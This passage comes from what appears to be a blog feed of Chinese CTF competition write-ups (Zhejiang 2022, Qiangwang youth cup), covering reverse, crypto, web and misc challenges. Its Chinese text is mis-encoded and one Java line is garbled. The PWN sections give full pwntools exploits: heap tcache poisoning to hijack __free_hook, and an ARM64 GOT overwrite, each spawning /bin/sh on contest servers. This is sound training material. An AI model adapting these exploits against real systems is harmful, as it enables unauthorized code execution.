<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; ccompare = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-built_in">this</span>.compare));<br>Integer[] compare = &#123;<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, IntegvalueOf((<span class="hljs-type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412&#125;;<br><span class="hljs-type">String</span> <span class="hljs-variable">mname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ccadwjlyah&quot;</span>;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> MainActivity.<span class="hljs-built_in">this</span>.name.getText().toString().trim();<br>    List&lt;Integer&gt; ppwd = MainActivity.change(MainActivity.<span class="hljs-built_in">this</span>.pass.getT().toString().trim());<br>    <span class="hljs-keyword">if</span> (!user.equals(<span class="hljs-built_in">this</span>.mname) || !ppwd.equals(<span class="hljs-built_in">this</span>.ccompare)) &#123;<br>        Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;errorï¼&quot;</span>, <span class="hljs-number">0</span>).show();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;correctï¼&quot;</span>, <span class="hljs-number">0</span>).show();<br>    MainActivity.<span class="hljs-built_in">this</span>.startActivity(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(MainActivity.<span class="hljs-built_in">this</span>, afterlclass));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åŠ å¯†å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Integer&gt; <span class="hljs-title function_">change</span><span class="hljs-params">(String args)</span> &#123;<br>    <span class="hljs-type">char</span>[] ch;<br>    List&lt;Integer&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : args.toCharArray()) &#123;<br>        list.add(Integer.valueOf((c ^ <span class="hljs-number">3</span>) &lt;&lt; <span class="hljs-number">2</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> list;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç”¨æˆ·åæ˜æ–‡å­˜å‚¨ï¼Œæ˜¯<code>ccadwjlyah</code></p>
<p>ç¨‹åºä¼šå¯¹è¾“å…¥åçš„å¯†ç åŠ å¯†ç„¶åä¸ç¨‹åºä¸­çš„<code>compare</code>å˜é‡æ¯”è¾ƒ</p>
<p>è·å–<code>compare</code>æ•°ç»„çš„å€¼ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªæˆå‘˜å­˜å‚¨åœ¨å˜é‡ä¸­</p>
<p><img src="/img/wp/2022/2022zhejiang-final-8.png"></p>
<p>è§£å¯†è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, <span class="hljs-number">200</span>, <span class="hljs-number">412</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((i&gt;&gt;<span class="hljs-number">2</span>)^<span class="hljs-number">3</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å¯†ç <code>f4n_4ndro1d</code></p>
<p><img src="/img/wp/2022/2022zhejiang-final-9.png"></p>
<p>èµ›åå‘ç°çš„ä¸€ä¸ªéé¢„æœŸï¼šå› ä¸ºæœ€åflagæ˜¯å­˜å‚¨åœ¨å›¾ç‰‡ä¸­çš„ï¼Œæ‰€ä»¥ç›´æ¥æŠŠapkå½“å‹ç¼©åŒ…è§£å‹ï¼Œå»æ‰¾å›¾ç‰‡ä¹Ÿèƒ½çœ‹åˆ°flag</p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><p>å› ä¸ºåŠ å¯†ä»£ç <code>(str.index(i)*key+7)%37</code>ä¸­å–ä½™äº†37ï¼Œæ‰€ä»¥keyçš„å€¼å¯ä»¥è®¤ä¸ºåœ¨0~37çš„èŒƒå›´å†…</p>
<p>ç›´æ¥çˆ†ç ´</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;u66hp7nuh01puoaip10pi6o0vzavnu11&#x27;</span><br>s=<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789+=&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):<br>    e=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>            <span class="hljs-keyword">if</span> s[((j*i)+<span class="hljs-number">7</span>)%<span class="hljs-number">37</span>]==a[n]:<br>                e=e+s[j]<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<p>çˆ†ç ´å‡º37ä¸²å­—ç¬¦ä¸²ï¼Œåªæœ‰ä¸€ä¸²å­—ç¬¦ä¸²æ»¡è¶³flagæ ¼å¼ï¼Œå³32ä½åå…­è¿›åˆ¶å­—ç¬¦ä¸²</p>
<p><img src="/img/wp/2022/2022zhejiang-final-10.png"></p>
<p>flag: <code>799a03b7a82076f5028059681df1b722</code></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>æµ™æ±Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬äº”å±Šæµ™æ±Ÿçœå¤§å­¦ç”Ÿç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›åˆèµ›-WP</title>
    <url>/posts/f203fa52/</url>
    <content><![CDATA[<h1 id="æˆ˜é˜Ÿä¿¡æ¯"><a href="#æˆ˜é˜Ÿä¿¡æ¯" class="headerlink" title="æˆ˜é˜Ÿä¿¡æ¯"></a>æˆ˜é˜Ÿä¿¡æ¯</h1><p>Rml</p>
<p>Rank: 32</p>
<h1 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h1><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nisc-easyweb"><a href="#nisc-easyweb" class="headerlink" title="nisc_easyweb"></a>nisc_easyweb</h3><p>è®¿é—®<code>/robots.txt</code>ï¼Œå‘ç°<code>/api/record</code>ï¼Œè®¿é—®ååˆ°<code>/test_api.php</code>ï¼ŒF12å¾—åˆ°<code>i=FlagInHere</code>ï¼ŒæŒ‰é¢˜ç›®è¦æ±‚getä¼ å‚æ‹¿åˆ°flag</p>
<h3 id="nisc-å­¦æ ¡é—¨æˆ·ç½‘ç«™"><a href="#nisc-å­¦æ ¡é—¨æˆ·ç½‘ç«™" class="headerlink" title="nisc_å­¦æ ¡é—¨æˆ·ç½‘ç«™"></a>nisc_å­¦æ ¡é—¨æˆ·ç½‘ç«™</h3><p>è®¿é—®å­¦ç”Ÿç³»ç»Ÿï¼Œä»»æ„æ³¨å†Œä¸€ä¸ªç”¨æˆ·è¿›å…¥ç³»ç»Ÿæ‹¿åˆ°flag</p>
<h3 id="åƒè±†äººåƒè±†é­‚"><a href="#åƒè±†äººåƒè±†é­‚" class="headerlink" title="åƒè±†äººåƒè±†é­‚"></a>åƒè±†äººåƒè±†é­‚</h3><p>åœ¨index.jsä¸­æœåˆ°å¤±è´¥è¿”å›å€¼ï¼ŒæˆåŠŸè¿”å›å€¼å°±åœ¨ä¸Šä¸€è¡Œ</p>
<p><img src="/img/wp/2022/2022zhejiang-1.png"></p>
<p>base64è§£å¯†æ‹¿åˆ°flag</p>
<p><code>REFTQ1RGe2YyMzViMDIzODJhMjIzZmRhNGNlMmVjNjIxNDhkOTRjfQ==</code></p>
<p><code>DASCTF&#123;f235b02382a223fda4ce2ec62148d94c&#125;</code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h3><p>å› ä¸ºç¨‹åºå­˜åœ¨<code>uaf</code>ï¼Œæ‰€ä»¥è¿ç»­é‡Šæ”¾ä¸¤ä¸ª<code>chunk</code>ï¼Œå¯ä»¥è·å–<code>heapæ®µåœ°å€</code>ï¼Œè¿™æ ·å¯ä»¥è®¡ç®—å‡º<code>tcache bin</code>çš„åœ°å€</p>
<p>é€šè¿‡è¦†ç›–<code>tcache bin</code>çš„å€¼ï¼Œåœ¨ä»»æ„åœ°å€æ”¾ç½®<code>chunk</code>ï¼Œè®¾ç½®<code>chunk0</code>çš„<code>size</code>ä¸º<code>0x430</code>ï¼Œå¹¶åœ¨<code>chunk0+0x430</code>çš„ä½ç½®å¤„æ„é€ ä¸¤ä¸ª<code>0x20</code>å­—èŠ‚çš„<code>chunk</code> é‡Šæ”¾<code>chunk0</code>ï¼Œè·å–<code>libc</code>åœ°å€ï¼Œå†åˆ©ç”¨<code>tcache bin</code>ï¼Œå¯ä»¥ä»¥æœ€å°‘çš„<code>chunk</code>æ•°ï¼Œåœ¨<code>free_hook</code>ä¸­å†™å…¥<code>system</code>å‡½æ•°åœ°å€</p>
<p>å†æ¬¡æ‰§è¡Œ<code>free</code>å‡½æ•°è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;index:&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p=remote(<span class="hljs-string">&#x27;1.14.97.218&#x27;</span>,<span class="hljs-string">&#x27;27188&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./babyheap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#1</span><br><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>heap=d&amp;<span class="hljs-number">0xfffffffffffff000</span>+<span class="hljs-number">0x70</span><br>edit(<span class="hljs-number">1</span>,p64(heap))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#3</span><br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(d-<span class="hljs-number">0x10</span>)+p64(d-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x430</span>))<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#5</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x21</span>))<br>edit(<span class="hljs-number">4</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x431</span>))<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>p.readuntil(<span class="hljs-string">&#x27; \n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>malloc_hook=d-<span class="hljs-number">0x60</span>-<span class="hljs-number">0x10</span><br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(free_hook))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">0x58</span>) <span class="hljs-comment"># 6</span><br>edit(<span class="hljs-number">6</span>,p64(system))<br>pause()<br>free(<span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022zhejiang-2.png"></p>
<h3 id="new-stack"><a href="#new-stack" class="headerlink" title="new_stack"></a>new_stack</h3><p><em>èµ›åå¤ç°</em></p>
<p><code>main</code>å‡½æ•°</p>
<p><img src="/img/wp/2022/2022zhejiang-3.png"></p>
<p>åé—¨å‡½æ•°</p>
<p><img src="/img/wp/2022/2022zhejiang-4.png"></p>
<p>åé—¨å‡½æ•°ä¼šå°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®å†™å…¥æ ˆä¸­ï¼Œåˆšå¥½æœ€å<code>8å­—èŠ‚</code>å¯ä»¥ä¿®æ”¹<code>X29å¯„å­˜å™¨</code>çš„å€¼ï¼Œè€Œè¿™ä¸ªå¯„å­˜å™¨åœ¨ç¨‹åºä¸­æ˜¯ç”¨æ¥ä¸´æ—¶å‚¨å­˜å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°çš„å¯„å­˜å™¨ï¼Œä¼šç”¨æ¥ä¿®æ”¹<code>X0å¯„å­˜å™¨</code>ï¼Œåˆšå¥½åœ¨åé—¨å‡½æ•°ç»“æŸåä¼šæ‰§è¡Œä¸€æ¬¡è¾“å…¥è¾“å‡ºï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡ä¿®æ”¹<code>gotè¡¨</code>æ§åˆ¶ç¨‹åºæµç¨‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;10.201.15.180&#x27;</span>,<span class="hljs-number">4444</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn1&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>read_1=<span class="hljs-number">0x4007f4</span><br>ret=<span class="hljs-number">0x400834</span><br>puts_got=e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts=<span class="hljs-number">0x400590</span><br>read=<span class="hljs-number">0x400590</span><br>bss=e.bss(<span class="hljs-number">0x100</span>)<br>p.readuntil(<span class="hljs-string">&#x27;name&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(puts_got-<span class="hljs-number">0x18</span>))<br>p.readuntil(<span class="hljs-string">&#x27;go&#x27;</span>)<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(puts))<br><span class="hljs-comment"># å› ä¸ºæ­£å¸¸è¾“å‡ºä¼šè¾“å‡ºputså‡½æ•°å¯¹åº”gotè¡¨é¡¹ä¸­çš„æ•°å€¼</span><br><span class="hljs-comment"># è¿™æ—¶åˆ©ç”¨ç¨‹åºçš„å»¶è¿Ÿç»‘å®šæŠ€æœ¯ï¼Œä¼šä½¿putså‡½æ•°å¯¹åº”gotè¡¨é¡¹ä¸­å‚¨å­˜çœŸå®çš„putså‡½æ•°åœ°å€</span><br><span class="hljs-comment"># å¯ä»¥ç”¨æ¥è·å–libcåœ°å€</span><br>d=(u64(p.readuntil(<span class="hljs-string">&quot;\nlet&#x27;s go&quot;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))&gt;&gt;<span class="hljs-number">8</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p.send(p64(read_1)+p64(read)+p64(ret))<br>p.send(p64(system)+p64(read)+p64(<span class="hljs-number">0x4007f0</span>))<br><span class="hljs-comment"># å…ˆé€šè¿‡ LDP  X29, X30, [SP+0x30+var_30],#0x30 æŒ‡ä»¤è®¾ç½®X29çš„å€¼ä¸ºæ ˆä¸­çš„æ•°å€¼</span><br><span class="hljs-comment"># å¹¶å°†putså‡½æ•°è®¾ç½®ä¸ºsystem</span><br><span class="hljs-comment"># è¿™æ—¶å‘æ ˆä¸­å†™å…¥/bin/sh ï¼Œåœ¨æ‰§è¡Œputså‡½æ•°æ—¶å°±ä¼šæ‰§è¡Œsystem(&quot;/bin/sh&quot;);</span><br>p.interactive()<br></code></pre></td></tr></table></figure>
<p><img src="/img/wp/2022/2022zhejiang-5.png"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="ManyCheck"><a href="#ManyCheck" class="headerlink" title="ManyCheck"></a>ManyCheck</h3><p>ç¨‹åºåœ¨<code>check1</code>ä¸­ä¼šæ£€æµ‹è¾“å…¥æ˜¯å¦ç­‰äº77</p>
<p><img src="/img/wp/2022/2022zhejiang-6.jpg"></p>
<p>åœ¨<code>check2</code>ä¸­è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—çš„å¹³æ–¹è¦ç­‰äº3025ï¼Œç¬¬äºŒä¸ªæ•°çš„å¹³æ–¹è¦ç­‰äº2401</p>
<p><img src="/img/wp/2022/2022zhejiang-7.jpg"></p>
<p>æ ¹æ®<code>reshort16</code>å‡½æ•°å¾—çŸ¥ï¼Œå°†<code>check3</code>è¾“å…¥çš„æ•°å­—çš„é«˜ä¸¤ä¸ªå­—èŠ‚å’Œä½ä¸¤ä¸ªå­—èŠ‚è°ƒæ¢ä½ç½®åè¦ç­‰äº<code>0x66744769</code></p>
<p><img src="/img/wp/2022/2022zhejiang-8.jpg"></p>
<p><img src="/img/wp/2022/2022zhejiang-9.jpg"></p>
<p>æŒ‰è¦æ±‚è¾“å…¥å®Œå››ä¸ªæ•°å­—æ‹¿åˆ°flag</p>
<p><img src="/img/wp/2022/2022zhejiang-10.png"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="å¥½æ€ªå“¦"><a href="#å¥½æ€ªå“¦" class="headerlink" title="å¥½æ€ªå“¦"></a>å¥½æ€ªå“¦</h3><p>å…ˆå°†æ–‡ä»¶åè½¬ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;fuck.zip&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br><br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p><code>flag.png</code>å°‘äº†æ–‡ä»¶å¤´ï¼Œè¡¥ä¸Š<code>89 50 4e 47</code></p>
<p>crcæŠ¥é”™ï¼Œä¿®æ”¹ä¸‹é«˜åº¦æ‹¿åˆ°flag</p>
<h3 id="ç¥å¥‡çš„æ£‹ç›˜"><a href="#ç¥å¥‡çš„æ£‹ç›˜" class="headerlink" title="ç¥å¥‡çš„æ£‹ç›˜"></a>ç¥å¥‡çš„æ£‹ç›˜</h3><p><em>èµ›åå¤ç°</em></p>
<p>lsbæŸ¥çœ‹0é€šé“ï¼Œå‘ç°ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œbase32è§£å¯†å¾—åˆ°<code>LastKey&#123;Yusayyds&#125;</code></p>
<p>é¦–å…ˆæ˜¯æ³¢åˆ©æ¯”å¥¥æ–¯æ–¹é˜µå¯†ç </p>
<p>æ‰‹æ“æˆ–è€…è„šæœ¬</p>
<p><img src="/img/wp/2022/2022zhejiang-11.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;11,22,11,53,53,14,11,22,22,51,22,22,51,14,51,11,14,11,51,53,14,22,11,14,51,22,14,51,11,11,14,14,14,14,21,53,11,21,11,21,14,22,14,51,53,53,14,22,22,14,22,22,14,53,14,14,21,14,14,53,51,22,53,11,14,22,51,14,21,53,51,51,11,11,14,14,53,14,53,53,11,14,14,51,22,22,22,53,22,53,53,53,53,22,53,53,22,22,53,22,14,51,51,51,22,22,22,11,22,11,11,11,11,22,11,11,22,22,11,22,14,14,14,11,22,11,22,22,22,11,22,22,11,22,11,22,11,11,11,51,11,11,11,53,22,53,22,22,22,53,22,22,53,22,53,22,53,53,53,51&#x27;</span><br>a=a.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>t=<span class="hljs-string">&quot;ABCDEFGHIKLMNOPQRSTUVWXYZ&quot;</span><br>n=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    n=n+t[(<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])-<span class="hljs-number">1</span>)*<span class="hljs-number">5</span>+<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])-<span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(n)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2022/2022zhejiang-12.png"></p>
<p>å¾—åˆ°<code>AGAXXDAGGVGGVDVADAVXDGADVGDVAADDDDFXAFAFDGDVXXDGGDGGDXDDFDDXVGXADGVDFXVVAADDXDXXADDVGGGXGXXXXGXXGGXGDVVVGGGAGAAAAGAAGGAGDDDAGAGGGAGGAGAGAAAVAAAXGXGGGXGGXGXGXXXV</code></p>
<p>åŠ ä¸Škeyè§£<code>ADFGVX</code>å¯†ç </p>
<p><img src="/img/wp/2022/2022zhejiang-13.png"></p>
<p><code>4441534354467b64383539633431633533306166633163316164393461626439326634626166387d</code></p>
<p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²å¾—åˆ°flag</p>
<h3 id="segmentFlow"><a href="#segmentFlow" class="headerlink" title="segmentFlow"></a>segmentFlow</h3><p><em>èµ›åå¤ç°</em></p>
<p>æ–‡ä»¶å¾ˆå°ï¼Œç›´æ¥crcçˆ†ç ´</p>
<p><img src="/img/wp/2022/2022zhejiang-14.png"></p>
<p>å¾—åˆ°è§£å‹å¯†ç <code>gZinflAte_BasE64</code></p>
<p><img src="/img/wp/2022/2022zhejiang-15.png"></p>
<p>è¿½è¸ªæµï¼Œå‘ç°<code>sa066b32bfb3e7</code>çš„å€¼åœ¨ä¼ é€’<code>zip</code>æ–‡ä»¶</p>
<p><img src="/img/wp/2022/2022zhejiang-16.png"></p>
<p>tsharkæå–å‡ºæ¥</p>
<p><code>tshark -r segmentFlow.pcapng -Y &quot;http.request&quot; -T fields -e http.file_data &gt; data.txt</code></p>
<p>æå–å‹ç¼©åŒ…éƒ¨åˆ†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;data.zip&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>)<br>data=f.read()<br>data=data.split(<span class="hljs-string">&#x27;&amp;sa066b32bfb3e7=&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-built_in">print</span>(data[i][:<span class="hljs-number">8</span>],end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>.fromhex(data[i][:<span class="hljs-number">8</span>]))<br></code></pre></td></tr></table></figure>

<p>è§£å‹å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022</tag>
        <tag>æµ™æ±Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>å¼ºç½‘æ¯é’å°‘å¹´æ¯åˆèµ›wp</title>
    <url>/posts/2ef8c529/</url>
    <content><![CDATA[<h1 id="æˆ˜é˜Ÿä¿¡æ¯"><a href="#æˆ˜é˜Ÿä¿¡æ¯" class="headerlink" title="æˆ˜é˜Ÿä¿¡æ¯"></a>æˆ˜é˜Ÿä¿¡æ¯</h1><p>æˆ˜é˜Ÿåç§°ï¼šRml<br>æˆ˜é˜Ÿæ’åï¼š5</p>
<h1 id="è§£é¢˜æƒ…å†µ"><a href="#è§£é¢˜æƒ…å†µ" class="headerlink" title="è§£é¢˜æƒ…å†µ"></a>è§£é¢˜æƒ…å†µ</h1><p><img src="/img/wp/2022/2022qwbqsn-1.png"></p>
<h1 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>CVE-2021-41773ï¼Œpayloadç›´æ¥æ‰“</p>
<p><img src="/img/wp/2022/2022qwbqsn-2.png"></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h3><p>base64è§£å¯†åå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä½†æ˜¯æ¯ä¸¤ä¸ªå­—èŠ‚è¢«æ¢äº†ä½ç½®</p>
<p>ä¿®å¤è„šæœ¬</p>
